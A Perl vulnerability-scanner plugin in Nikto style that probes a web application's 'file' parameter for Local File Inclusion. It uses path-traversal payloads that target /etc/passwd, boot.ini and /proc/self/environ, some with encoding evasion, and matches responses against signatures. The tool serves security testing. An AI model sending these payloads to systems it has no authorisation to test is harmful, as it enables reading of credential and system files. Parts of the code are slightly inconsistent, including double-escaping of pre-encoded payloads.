###########################################################################
# Plugin: check_lfi.pl
# Purpose: Detect Local File Inclusion (LFI) vulnerabilities
# Author: TeslaAI Offensive Security Core (20 agents + 3 meta-generals)
# License: TeslaAI-Secure-License-1.3
# Version: 2.0.industrial
###########################################################################

package Nikto::Plugin::Traversal::LocalFileInclusion;

use strict;
use warnings;
use Digest::SHA qw(sha256_hex);
use Time::HiRes qw(gettimeofday tv_interval);
use URI::Escape;
use TeslaAI::Logger qw(log_vuln);

# Plugin metadata
our $PLUGIN_ID = "TRAVERSAL-002";
our $CWE_ID    = "CWE-98";

# LFI Payloads
my @payloads = (
    "../../../../../../etc/passwd",
    "..\\..\\..\\..\\..\\..\\..\\boot.ini",
    "..%252f..%252f..%252f..%252fetc/passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "/proc/self/environ",
    "../../../../../../dev/null"
);

# Signature indicators
my @signatures = (
    qr/root:.*:0:0:/,               # /etc/passwd
    qr/\[boot loader\]/i,           # Windows boot.ini
    qr/USER=/i,                     # /proc/self/environ
);

sub run_check_lfi {
    my ($target_url, $http_client, $logger) = @_;

    foreach my $payload (@payloads) {
        my $encoded_payload = uri_escape($payload);
        my $test_url = $target_url . "?file=$encoded_payload";

        my $start_time = [gettimeofday];
        my $response = $http_client->get($test_url);
        my $elapsed = tv_interval($start_time);

        next unless $response && $response->is_success;

        my $body = $response->decoded_content;

        foreach my $sig (@signatures) {
            if ($body =~ $sig) {
                my $vuln_id = sha256_hex($PLUGIN_ID . $payload . $target_url);

                log_vuln({
                    id         => $vuln_id,
                    plugin     => $PLUGIN_ID,
                    severity   => "high",
                    cwe        => $CWE_ID,
                    desc       => "Local File Inclusion detected via '$payload'",
                    target     => $target_url,
                    http_code  => $response->code,
                    latency_ms => sprintf("%.3f", $elapsed * 1000),
                    confirmed  => 1,
                    evidence   => substr($body, 0, 150),
                }, $logger);

                return 1;
            }
        }
    }

    return 0; # No LFI vulnerability found
}

1;

__END__

=head1 NAME

check_lfi.pl — Industrial LFI Detection Plugin for Nikto (TeslaAI)

=head1 DESCRIPTION

Detects LFI vulnerabilities in web applications using multiple encoding
evasion strategies, forensic signature verification, and response latency 
profiling. Integrated with TeslaAI's modular logging and fingerprinting framework.

=head1 AUTHOR

TeslaAI Offensive Security Core Team (c) 2025

=cut
